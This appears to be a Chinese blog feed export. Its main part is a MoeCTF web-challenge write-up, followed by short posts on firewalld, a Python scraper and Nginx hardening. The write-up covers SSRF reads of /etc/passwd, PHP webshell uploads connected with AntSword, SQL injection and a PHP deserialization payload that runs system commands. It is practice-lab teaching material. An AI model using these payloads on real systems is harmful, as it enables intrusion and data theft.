src="https://pic.imgdb.cn/item/66b9f39ad9c307b7e9187878.png" style="zoom:67%;"><img src="https://pic.imgdb.cn/item/66b9f3c1d9c307b7e918a808.png" style="zoom: 67%;"><p>得到扫描结果，发现有一个robot.txt文件，访问看看</p><p><img src="https://pic.imgdb.cn/item/66b9f3f8d9c307b7e918ecfd.png"></p><p>他说只有robots才可以看web-tutor，那么就按照他说的来，改代理和disallow，在此界面抓包，放到重放器里，改完之后，发送</p><p><img src="https://pic.imgdb.cn/item/66b9f420d9c307b7e9191eb3.png"></p><p>那么现在就去刚刚看不了的东西里看看，答案出现</p><img src="https://pic.imgdb.cn/item/66b9f4ead9c307b7e91a0455.png" style="zoom: 50%;"><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h3><p>刚开始就提示你用post发请求了</p><p><img src="https://pic.imgdb.cn/item/66b9f55bd9c307b7e91a7c44.png"></p><p>但是还不知道请求参数，那么点击hit the question setter，出现参数，那么就来请求吧，这里我用的harkbar</p><p><img src="https://pic.imgdb.cn/item/66b9f604d9c307b7e91b3b77.png"></p><p>发起请求，这里不用参数，也可以只要是post方法就行</p><p><img src="https://pic.imgdb.cn/item/66b9f6aed9c307b7e91bf4b3.png"></p><p>下一步要求post参数了，按照他的来</p><p><img src="https://pic.imgdb.cn/item/66b9f70cd9c307b7e91c5eb8.png"></p><p>要求get参数</p><p><img src="https://pic.imgdb.cn/item/66b9f740d9c307b7e91c8ee8.png"></p><p>要求源来自于这个地址，那么标识源的就是refer参数，添加一个refer参数</p><p><img src="https://pic.imgdb.cn/item/66b9f794d9c307b7e91cda74.png"></p><p>要求cookie的值，添加一个cookie的值</p><p><img src="https://pic.imgdb.cn/item/66b9f7d7d9c307b7e91d2042.png"></p><p>要求使用这个浏览器，那么相当于要让此浏览器来作为代理，那么就改</p><p><img src="https://pic.imgdb.cn/item/66b9f823d9c307b7e91d743d.png"></p><p>这里要求只允许本地进入，其实就是配置X-Forwarded-For，将其配置为本地</p><p><img src="https://pic.imgdb.cn/item/66b9f8a4d9c307b7e91dff5a.png"></p><p>得到flag</p><h3 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h3><p>先看题目，300份，敏感的人已经大概率猜到应该是要用intruder</p><p><img src="https://pic.imgdb.cn/item/66b9f966d9c307b7e91f43bf.png"></p><p>打开环境是一个post表单，先填一填信息，直接burpsuite抓包</p><p><img src="https://pic.imgdb.cn/item/66b9f942d9c307b7e91ecd13.png"></p><p>抓到这个包，里面有我提交的信息，然后放到intruder里</p><p><img src="https://pic.imgdb.cn/item/66b9fa9cd9c307b7e922ac99.png"></p><p>直接攻击，这里给他发400份，防止意外</p><p><img src="https://pic.imgdb.cn/item/66b9fb31d9c307b7e924a471.png"></p><p>攻击之后，查看网页页面，flag出来了</p><p><img src="https://pic.imgdb.cn/item/66b9ff76d9c307b7e92c4689.png"></p><h3 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="headerlink" title="弗拉格之地的挑战"></a>弗拉格之地的挑战</h3><p><img src="https://pic.imgdb.cn/item/66ba1316d9c307b7e947e4d7.png"></p><p>按照步骤访问第一个页面 /flag1ab.html</p><p><img src="https://pic.imgdb.cn/item/66ba1339d9c307b7e9480a3f.png"></p><p>首先，一片空白不存在的，第一反应就是查看源代码</p><p><img src="https://pic.imgdb.cn/item/66ba138ad9c307b7e9485b4c.png"></p><p>按照步骤访问第二个页面 /flag2hh.php</p><p><img src="https://pic.imgdb.cn/item/66ba13ecd9c307b7e948c7a0.png"></p><p>他提到了http网络传输，那么就是看一下network的请求包和响应包，也是不出意外的在响应头中找到了信息</p><p><img src="https://pic.imgdb.cn/item/66ba14c2d9c307b7e949ac6f.png"></p><p>按照他给的提示，继续前往第三个页面 /flag3cad.php</p><p><img src="https://pic.imgdb.cn/item/66ba1530d9c307b7e94a192e.png"></p><p>这里多半就是要考传参了，直接用harkbar，一步到位</p><p><img src="https://pic.imgdb.cn/item/66ba1614d9c307b7e94ca04c.png"></p><p><img src="https://pic.imgdb.cn/item/66ba15e4d9c307b7e94be9ac.png"></p><p>继续前往下一关，哦吼，有坑，经过深思熟虑，他提到过来，那么就是来源，从哪来，那么尝试一波更改referer</p><p><img src="https://pic.imgdb.cn/item/66ba1697d9c307b7e94e8612.png"></p><p>搞起</p><p><img src="https://pic.imgdb.cn/item/66ba1718d9c307b7e94fe317.png"></p><p>直接进入下一个页面</p><p><img src="https://pic.imgdb.cn/item/66ba17bad9c307b7e9510650.png"></p><p>看到这个页面，按下开始后，让我按9，很明显没有9，但是我可以自己写一个9的按钮</p><img src="https://pic.imgdb.cn/item/66ba1825d9c307b7e951b6cc.png" style="zoom: 67%;"><p>这不就有了</p><p><img src="https://pic.imgdb.cn/item/66ba1850d9c307b7e95267d3.png"></p><p>还不给我flag,还需要一波操作</p><p><img src="https://pic.imgdb.cn/item/66ba1885d9c307b7e9533383.png"></p><p>console.log是控制台输出信息,那当然是去控制台查看了</p><p><img src="https://pic.imgdb.cn/item/66ba194bd9c307b7e956139b.png"></p><p>前往下一个页面 /flag5sxr.php</p><p><img src="https://pic.imgdb.cn/item/66ba1980d9c307b7e95648a8.png"></p><p>他让我输入,那就按照他输入,但是好像是不行的</p><p><img src="https://pic.imgdb.cn/item/66ba19d7d9c307b7e956aa8e.png"></p><p>查看一下源代码吧,源代码里有他的前端验证规则</p><p><img src="https://pic.imgdb.cn/item/66ba1a3cd9c307b7e9571486.png"></p><p>然后就发现,好像没什么用</p><p><img src="https://pic.imgdb.cn/item/66ba1addd9c307b7e957cda8.png"></p><p>或许,这才是关键,他说前端不靠谱,意思就是绕过前端检查吧,那我直接把的调用命令删了,是不是就可以了</p><p>来,开干!</p><p><img src="https://pic.imgdb.cn/item/66ba1b3dd9c307b7e9584022.png"></p><p>把onsubmit这个参数删了,然后再输入一次”我想要flag”(英文)</p><p><img src="https://pic.imgdb.cn/item/66ba1b90d9c307b7e958a4d2.png"></p><p>成功!!前往下一关!</p><p><img src="https://pic.imgdb.cn/item/66ba1bc4d9c307b7e958dd6c.png"></p><p>分析一下,存在一个get请求,存在一个post请求,如果get请求参数等于”/flag/“的时候就die,然后如果get请求参数等于”/flag/i”就出现flag,最大的问题就是匹配get的这个if语句先执行,即使输入/flag/i,也会被if语句匹配了,那么就永远执行不了elseif</p><p>根据php学习的知识,php是不区分大小写的,那不是就可以大小写直接绕过吗?</p><p>因为get和post都要,要用到harkbar,但是post没要求,随便给个值就可以</p><img src="https://pic.imgdb.cn/item/66ba1dfcd9c307b7e95b6110.png" style="zoom:67%;"><p>下一关!!!</p><p><img src="https://pic.imgdb.cn/item/66ba1e33d9c307b7e95b9df2.png"></p><p>熟悉的eval和POST,直接一个蚁剑拿下</p><img src="https://pic.imgdb.cn/item/66ba1ea9d9c307b7e95c2657.png" style="zoom: 50%;"><p>根目录下找到两个文件,一个flag,一个提示</p><p><img src="https://pic.imgdb.cn/item/66ba1efbd9c307b7e95c8d2d.png"></p><p>flag在此!</p><p><img src="https://pic.imgdb.cn/item/66ba1f29d9c307b7e95cbe5b.png"></p><p>提示文件:</p><p><img src="https://pic.imgdb.cn/item/66ba1f45d9c307b7e95ce0f6.png"></p><p>按照提示,把之前的所有flag按顺序拼在一起,一看,大小写还有等于号,妥妥base64编码,直接网上找一个base64解码平台,解开就有flag了</p><p>结束!七龙珠!</p><h2 id="第二、三周"><a href="#第二、三周" class="headerlink" title="第二、三周"></a>第二、三周</h2><h3 id="ImageCloud前置"><a href="#ImageCloud前置" class="headerlink" title="ImageCloud前置"></a>ImageCloud前置</h3><p><img src="https://pic.imgdb.cn/item/66c1fc64d9c307b7e9700049.png"></p><p>看题目要求，其实熟悉SSRF的人，一眼就知道这是一个SSRF漏洞，因为有一些关键词，’url’，’/etc/passwd’是linux系统中用户文件，’出不了网’，这一些都说明是在内网中，那么SSRF漏洞就可以让服务端去访问内网的网址，可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</p><p><img src="https://pic.imgdb.cn/item/66c1fd24d9c307b7e971d939.png"></p><p>这里需要上传一个url那么就直接来读文件吧</p><p><img src="https://pic.imgdb.cn/item/66c1fddfd9c307b7e973d087.png"></p><p>读出了文件，就找到了flag</p><p><img src="https://pic.imgdb.cn/item/66c1fe03d9c307b7e973ef8e.png"></p><h3 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a>ImageCloud</h3><img src="https://pic.imgdb.cn/item/66c230f2d9c307b7e9dd3944.png" style="zoom: 67%;"><p>依旧用刚才上传的php一句话木马实验一下</p><p><img src="https://pic.imgdb.cn/item/66c23120d9c307b7e9dd5d0a.png"></p><p>现在上传php后缀名就不可以了，那就换一个jpg上传试试，burpsuit抓包，更改文件后缀名php5、php3、phtml均被过滤了</p><h3 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h3><p><img src="https://pic.imgdb.cn/item/66c1fe6cd9c307b7e9746e04.png"></p><p>这题很简单，已经getshell，直接执行Linux系统代码试试（常见的服务器系统是Linux）</p><p><img src="https://pic.imgdb.cn/item/66c1febdd9c307b7e97574a9.png"></p><p>查看一下flag文件内容</p><p><img src="https://pic.imgdb.cn/item/66c1fee2d9c307b7e975b5fd.png"></p><p>看来是不在这个文件里的</p><p><img src="https://pic.imgdb.cn/item/66c20037d9c307b7e9795641.png"></p><p>也不在这里，经过我一番查看，一番折腾，寻找资料</p><p>才意识到他让我们看环境变量</p><p>$PATH、$HOME、$SHELL等那么多环境变量，去找哪一个呢？</p><p>最后经过一番查找，找到了两个查找环境变量的命令</p><ul><li>env </li><li>echo $FLAG（这个是FLAG作为了环境变量）</li></ul><p>终于找出来了！两个命令都可以查看flag</p><p><img src="https://pic.imgdb.cn/item/66c209eed9c307b7e991fcad.png"></p><p><img src="https://pic.imgdb.cn/item/66c20a05d9c307b7e9921135.png"></p><h3 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h3><p><img src="https://pic.imgdb.cn/item/66c20a96d9c307b7e992c38d.png"></p><p>看题目就是一个文件上传漏洞，上传一个php文件，里面包含一句话木马，然后用蚁剑连后门，直接控制系统，那么就开干！</p><p><img src="https://pic.imgdb.cn/item/66c20abdd9c307b7e9931e34.png"></p><p>他说上传图片，但是我还是想先直接上传一个php文件先试试</p><p><img src="https://pic.imgdb.cn/item/66c20b80d9c307b7e9953ae7.png"></p><p>所以说上传图片都是假的，他还没过滤我的php文件名后缀</p><p>那么直接用蚁剑连吧！</p><p><img src="https://pic.imgdb.cn/item/66c20c0dd9c307b7e996a3a5.png"></p><p>连接成功，进来寻找一波</p><p><img src="https://pic.imgdb.cn/item/66c20c4bd9c307b7e996da47.png"></p><p>熟悉的配方，和垫刀01一样的flag.sh，那么直接开一个虚拟终端，直接输入命令来查看</p><p><img src="https://pic.imgdb.cn/item/66c20dead9c307b7e99a7e55.png"></p><p><img src="https://pic.imgdb.cn/item/66c20e10d9c307b7e99ad124.png"></p><p>flag出现，结束！</p><h3 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h3><p><img src="https://pic.imgdb.cn/item/66c34b93d9c307b7e93995c4.png"></p><p>上传一个带一句话木马的jpg图片，然后在bp中将文件类型改为php，也就是绕过前端的js对后缀名的检查</p><p><img src="https://pic.imgdb.cn/item/66c34d97d9c307b7e93b94d9.png"></p><p><img src="https://pic.imgdb.cn/item/66c34dd8d9c307b7e93bd119.png"></p><p>已经保存到这个位置，用蚁剑直接连接试试</p><img src="https://pic.imgdb.cn/item/66c34db7d9c307b7e93bb589.png" style="zoom: 50%;"><p>连接成功，那就进去看看，然后之后的操作就和上面一样了，开一个虚拟终端，查看环境变量</p><p><img src="https://pic.imgdb.cn/item/66c34e53d9c307b7e93c6106.png"></p><h3 id="垫刀之路04-一个文件浏览器"><a href="#垫刀之路04-一个文件浏览器" class="headerlink" title="垫刀之路04: 一个文件浏览器"></a>垫刀之路04: 一个文件浏览器</h3><p><img src="https://pic.imgdb.cn/item/66c5fc0cd9c307b7e99566a8.png"></p><p>题目说在下面的文件里找flag，那么就开始吧</p><img src="https://pic.imgdb.cn/item/66c5fc24d9c307b7e99580f1.png" style="zoom: 67%;"><p>点开链接一个一个找，果然也是没用的，但是url弹出了一个path的参数，让我想到了ssrf，那么就来一试</p><img src="https://pic.imgdb.cn/item/66d0a45cd9c307b7e9811c41.png" style="zoom:50%;"><p>找到flag文件，但是打开没有flag，需要继续寻找</p><p><img src="https://pic.imgdb.cn/item/66d0a4fad9c307b7e981ac14.png"></p><p>最后在这个目录找到了</p><p><img src="https://pic.imgdb.cn/item/66d0a58cd9c307b7e9824018.png"></p><p>flag在此</p><p><img src="https://pic.imgdb.cn/item/66d0a5b4d9c307b7e98263d6.png"></p><h3 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h3><p><img src="https://pic.imgdb.cn/item/66c60073d9c307b7e9996ff6.png"></p><img src="https://pic.imgdb.cn/item/66c600a0d9c307b7e9999cb9.png" style="zoom:67%;"><p>第一反应就是，不信，我就要爆破，结果真的爆不出来，已老实，求放过</p><p>可能前面做题，harkbar用多了，下一反应就是用harkbar捣鼓一下，还是不行</p><p>最后想到了好久没用过的sql注入，哦吼，真就出来了</p><p><img src="https://pic.imgdb.cn/item/66c60311d9c307b7e9a0f4b7.png"></p><p>只能说，久违了SQL注入！</p><h3 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h3><img src="https://pic.imgdb.cn/item/66c60402d9c307b7e9a3a44f.png" style="zoom:67%;"><p>很典型的一个pop链，开干，分析代码，可执行指令eval，$s执行eval</p><p>传入data参数反序列化之后得到a，那么payload就应该将a序列化</p><p>类 A中有属性a，并且有一个__destruct()函数，是在对象销毁时调用，也可以说创建对象之后，不用了销毁之后调用，那么就创建一个对象</p><p>并且实例化一个对象后，a的值赋值给s，这意味着 $s变量所引用的值(也就是 this-&gt;a)将被作为一个函数或方法调用,并传入 this-&gt;evil作为参数</p><p>我们可以使用 system 函数来执行任意的系统命令</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new A();  </span><br><span class="line">$a-&gt;evil = "ls /";  </span><br><span class="line">$a-&gt;a = "system";</span><br></pre></td></tr></tbody></table></figure><p>那么构造payload</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:52682/?data=O:1:"A":2:{s:4:"evil";s:4:"ls /";s:1:"a";s:6:"system";}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66d0b8b0d9c307b7e99cd076.png"></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:52682/?data=O:1:"A":2:{s:4:"evil";s:9:"cat /flag";s:1:"a";s:6:"system";}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic.imgdb.cn/item/66d0b8f8d9c307b7e99dab43.png">flag就出来了</p><h3 id="静态页面"><a href="#静态页面" class="headerlink" title="静态页面"></a>静态页面</h3><p><img src="https://pic.imgdb.cn/item/66c210ccd9c307b7e9a29c35.png"></p><p>好好好，什么都没有，查看了页面源代码，查看了检查，啥都没有</p><p>直接扔到burpsuit里进行扫描，看看有没有其他目录和文件，然后真就有</p><img src="https://pic.imgdb.cn/item/66c21130d9c307b7e9a3a954.png" style="zoom:50%;"><p>看到了flag的踪影，那就先访问一下这个页面吧</p><img src="https://pic.imgdb.cn/item/66c21167d9c307b7e9a41c1b.png" style="zoom:50%;"><p>让我直接访问这个php文件，照做就行</p><img src="https://pic.imgdb.cn/item/66c2119ad9c307b7e9a4a031.png" style="zoom:50%;"><p>有眉目了，继续继续，既要上传get又要上传post请求，那么harkbar直接上</p><p>isset就是存在，isnumeric就是是数字，a和b不能是数字，且（$a ==0&amp;&amp;md5($a)==$b[$a]）</p><p>$b[$a]：这个表达式访问数组 $b中索引为$a 的元素</p><p>这里绞尽脑汁了，还是有点困难，最后请教了一位大神</p><p><img src="https://pic.imgdb.cn/item/66c22dbad9c307b7e9daa844.png"></p><p>我们来看传入的a参数，首先会验证a是否是一个数字，不是数字才能通过，这里我们用到0%201，用0%20也行，%20在url编码中空格，用 0空格 就可以绕过数字的检查，然后进入到之后的条件$a == 0，这里==是弱比较，JavaScript 会将0空格字符串 ‘0 ‘ 转换为数字 0，然后比较 0 == 0，结果为 true，b的话只需要去网上找一个md5加密工具加密一下’0空格’就可以，最后得到flag</p><h3 id="电院-Backend"><a href="#电院-Backend" class="headerlink" title="电院_Backend"></a>电院_Backend</h3><h3 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="headerlink" title="勇闯铜人阵"></a>勇闯铜人阵</h3><h3 id="XDSEC-MessageBox"><a href="#XDSEC-MessageBox" class="headerlink" title="XDSEC_MessageBox"></a>XDSEC_MessageBox</h3>]]></content>
      
      
      <categories>
          
          <category> MoeCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>firewalld防火墙</title>
      <link href="/2024/08/06/firewalld-fang-huo-qiang/"/>
      <url>/2024/08/06/firewalld-fang-huo-qiang/</url>
      
        <content type="html"><![CDATA[<h1 id="firewalld防火墙"><a href="#firewalld防火墙" class="headerlink" title="firewalld防火墙"></a>firewalld防火墙</h1>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> firewalld防火墙 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫简单应用</title>
      <link href="/2024/08/05/python-pa-chong-jian-dan-ying-yong/"/>
      <url>/2024/08/05/python-pa-chong-jian-dan-ying-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="Python爬虫简单应用"><a href="#Python爬虫简单应用" class="headerlink" title="Python爬虫简单应用"></a>Python爬虫简单应用</h1><blockquote><p>首先需要Python两个第三方库，一个Requests，一个BeautifulSoup</p><p>下载很简单，前提是有pip，直接在终端输入pip install requests pip install bs4</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#导入第三方库</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">#这里的header是在有些网站不允许爬虫的情况下，通过伪造请求头，得到请求的方式，当然，别人不允许的东西，还是要听话，这里因为是我自己的个人博客也就无所谓了，哈哈</span><br><span class="line">header = {</span><br><span class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"</span><br><span class="line">}</span><br><span class="line">#用content来接收请求得到的内容,指定的网站是我自己的博客地址</span><br><span class="line">content = requests.get("https://www.xmhhmx.top",headers=header).text</span><br><span class="line">#将content传入BeautifulSoup的构造函数里面，返回一个对象赋值给soup</span><br><span class="line">#html.parser指定html解析器，说明是在解析html语句</span><br><span class="line">soup = BeautifulSoup(content,"html.parser")</span><br><span class="line">#根据元素属性提取：attrs</span><br><span class="line">#提取信息的特点就是都在span标签内并且class值都为card-title</span><br><span class="line">all_title = soup.findAll("span",attrs={"class":"card-title"})</span><br><span class="line">#遍历 .string：获取内容</span><br><span class="line">for title in all_title:</span><br><span class="line">    print(title.string)</span><br></pre></td></tr></tbody></table></figure><blockquote><p>当然以上代码只能读取第一页的文章标题，因为个人在设计网站的原因，资源路径没设计好，第一个页面就是域名访问页面，而第2、3……页的资源路径为/page/2（3、……）</p><p>所以要想实现所有页面爬取就得分开处理</p></blockquote><p>代码实现，略显繁琐，单独处理第一页界面</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">header = {</span><br><span class="line">    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"</span><br><span class="line">}</span><br><span class="line">#第一页</span><br><span class="line">content = requests.get("https://www.xmhhmx.top",headers=header).text</span><br><span class="line">soup = BeautifulSoup(content,"html.parser")</span><br><span class="line">all_title = soup.findAll("span",attrs={"class":"card-title"})</span><br><span class="line">for title in all_title:</span><br><span class="line">    print(title.string)</span><br><span class="line">#第2页及以后</span><br><span class="line">for start_page in range(2,10):</span><br><span class="line">    content = requests.get(f"https://www.xmhhmx.top/page/{start_page}", headers=header).text</span><br><span class="line">    soup = BeautifulSoup(content, "html.parser")</span><br><span class="line">    all_title = soup.findAll("span", attrs={"class": "card-title"})</span><br><span class="line">    for title in all_title:</span><br><span class="line">        print(title.string)</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见的中间件</title>
      <link href="/2024/08/03/chang-jian-de-zhong-jian-jian/"/>
      <url>/2024/08/03/chang-jian-de-zhong-jian-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="常见的中间件"><a href="#常见的中间件" class="headerlink" title="常见的中间件"></a>常见的中间件</h1><h2 id="常见的中间件分类"><a href="#常见的中间件分类" class="headerlink" title="常见的中间件分类"></a><strong>常见的中间件分类</strong></h2><ol><li>消息队列中间件：用于在应用程序之间进行异步消息传递。消息队列中间件包括<strong>RabbitMQ</strong>、Apache Kafka、ActiveMQ等。</li><li>数据库中间件：用于管理和访问数据库。数据库中间件包括MySQL Proxy、PostgreSQL PgBouncer等。</li><li>缓存中间件：用于加速数据访问，减轻数据库负载。缓存中间件包括<strong>Redis</strong>、Memcached等。</li><li>Web服务器中间件：用于处理HTTP请求和响应。常见的Web服务器中间件包括<strong>Nginx</strong>、<strong>Apache</strong>等。</li><li>应用服务器中间件：用于托管和管理应用程序的执行环境。常见的应用服务器中间件包括<strong>Tomcat</strong>、Jboss等。</li><li>API网关中间件：用于管理和控制API的访问和调用。常见的API网关中间件包括Kong、Apigee等。</li></ol><h2 id="消息队列中间件"><a href="#消息队列中间件" class="headerlink" title="消息队列中间件"></a>消息队列中间件</h2><h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx的安全加固</title>
      <link href="/2024/08/02/nginx-de-an-quan-jia-gu/"/>
      <url>/2024/08/02/nginx-de-an-quan-jia-gu/</url>
      
        <content type="html"><![CDATA[<h1 id="Nginx的安全加固"><a href="#Nginx的安全加固" class="headerlink" title="Nginx的安全加固"></a>Nginx的安全加固</h1><h2 id="（1）隐藏nginx版本信息，防止页面报错暴露nginx版本"><a href="#（1）隐藏nginx版本信息，防止页面报错暴露nginx版本" class="headerlink" title="（1）隐藏nginx版本信息，防止页面报错暴露nginx版本"></a><strong>（1）隐藏nginx版本信息，防止页面报错暴露nginx版本</strong></h2><p>在配置文件中加入</p><p>http {</p><p>  server_tokens off;</p><p>}</p><h2 id="（2）以专门的用户帐号和组运行nginx"><a href="#（2）以专门的用户帐号和组运行nginx" class="headerlink" title="（2）以专门的用户帐号和组运行nginx"></a><strong>（2）以专门的用户帐号和组运行nginx</strong></h2><p>根据需要为nginx创建用户、组</p><p>创建nginx组：groupadd nginx</p><p>创建nginx用户并加入nginx组：useradd nginx –g nginx</p><p>在配置文件中加入允许运行nginx服务器的用户和用户组</p><p><img src="https://pic.imgdb.cn/item/66ac983bd9c307b7e932c561.png"></p><h2 id="（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容"><a href="#（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容" class="headerlink" title="（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容"></a><strong>（3）严格控制nginx主目录的访问权限，非超级用户不能修改该目录中的内容</strong></h2><ul><li>1一般为/etc/nginx目录，默认情况下属主为root:root，其它用户不能修改文件，默认一般符合要求</li></ul><p><img src="https://pic.imgdb.cn/item/66ac9887d9c307b7e9330ee0.png"></p><ul><li>2严格设置配置文件和日志文件的权限，防止未授权访问。</li></ul><p>chmod 600 /etc/nginx/nginx.conf”设置配置文件为属主可读写，其他用户无权限</p><p>未改之前：所有用户均可读</p><p><img src="https://pic.imgdb.cn/item/66ac98abd9c307b7e933361a.png"></p><p>更改之后：</p><p><img src="https://pic.imgdb.cn/item/66ac98bed9c307b7e9334895.png"></p><ul><li>3使用命令”chmod 644 /var/log/nginx/*.log”设置日志文件为属主可读写，其他用户只读权限。</li></ul><p>未更改之前：所有人可读</p><p><img src="https://pic.imgdb.cn/item/66ac98ced9c307b7e9335694.png"></p><p>此情况是正常的，不能让除属主之外的人拥有更改权限</p><h2 id="（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的-IP-地址等内容"><a href="#（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的-IP-地址等内容" class="headerlink" title="（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的 IP 地址等内容"></a><strong>（4）设备应配置日志功能，对运行错误、用户访问等进行记录，记录内容包括时间，用户使用的 IP 地址等内容</strong></h2><p><img src="https://pic.imgdb.cn/item/66ac98e1d9c307b7e9336612.png"></p><p><img src="https://pic.imgdb.cn/item/66ac98efd9c307b7e9337308.png"></p><h2 id="（5）禁止访问外部文件"><a href="#（5）禁止访问外部文件" class="headerlink" title="（5）禁止访问外部文件"></a><strong>（5）禁止访问外部文件</strong></h2><p> 通过Nginx配置，禁止访问特定后缀的资源</p><p>location ~ .*.(rar|zip|gz|tar|7z|xz|bz2|bak)?$</p><p>{</p><p>  return 403;</p><p>}</p><h2 id="（6）错误信息重定向"><a href="#（6）错误信息重定向" class="headerlink" title="（6）错误信息重定向"></a><strong>（6）错误信息重定向</strong></h2><p><img src="https://pic.imgdb.cn/item/66ac98ffd9c307b7e933872e.png"></p><h2 id="（7）禁止目录列出：目录列出会导致明显信息泄露或下载"><a href="#（7）禁止目录列出：目录列出会导致明显信息泄露或下载" class="headerlink" title="（7）禁止目录列出：目录列出会导致明显信息泄露或下载"></a><strong>（7）禁止目录列出：目录列出会导致明显信息泄露或下载</strong></h2><p>在配置文件中http{}中如果autoindex on那么当访问目录没有访问页面时，会将这个目录的内容列出</p><p><img src="https://pic.imgdb.cn/item/66ac9911d9c307b7e9339a64.png"></p><p>所以要将antoindex关闭autoindex off，就可以保护信息不被泄露</p><p><img src="https://pic.imgdb.cn/item/66ac9923d9c307b7e933ac55.png"></p><p>不过，默认配置文件是不会写autoindex的，也就是默认就禁止目录列出了</p><h2 id="（8）拒绝服务防范：合理设置-session-时间，防止拒绝服务攻击"><a href="#（8）拒绝服务防范：合理设置-session-时间，防止拒绝服务攻击" class="headerlink" title="（8）拒绝服务防范：合理设置 session 时间，防止拒绝服务攻击"></a><strong>（8）拒绝服务防范：合理设置 session 时间，防止拒绝服务攻击</strong></h2><ul><li>1在http{}中写入session保持时间</li></ul><p><img src="https://pic.imgdb.cn/item/66ac9933d9c307b7e933b967.png"></p><ul><li>2设置客户端请求读取超时时间</li></ul><p>http {</p><p>  proxy_connect_timeout 10s;</p><p>  proxy_read_timeout 30s;</p><p>}</p><p>proxy_connect_timeout设置为10秒， proxy_read_timeout设置为30秒。当客户端请求在这些时间段内没有得到响应时，将会超时。</p><ul><li>3设置客户端连接保持活动的超时时间</li></ul><p>http {</p><p>  client_body_timeout 10s;</p><p>  client_header_timeout 10s;</p><p>}</p><p>client_body_timeout：该参数设置客户端向Nginx发送请求正文的超时时间。如果在该时间内客户端没有发送数据，Nginx将关闭连接。</p><p>client_header_timeout：该参数设置客户端向Nginx发送请求头的超时时间。如果在该时间内客户端没有发送请求头，Nginx将关闭连接。</p><h2 id="（9）限制HTTP请求方法"><a href="#（9）限制HTTP请求方法" class="headerlink" title="（9）限制HTTP请求方法"></a><strong>（9）限制HTTP请求方法</strong></h2><p>if ($request_method !~ ^(GET|POST)$ ) {</p><p>​return 444;</p><p>}</p><p>$request_method能获取到请求时所使用的method，应该配置只使用GET/POST方法访问，其他的method返回444</p><h2 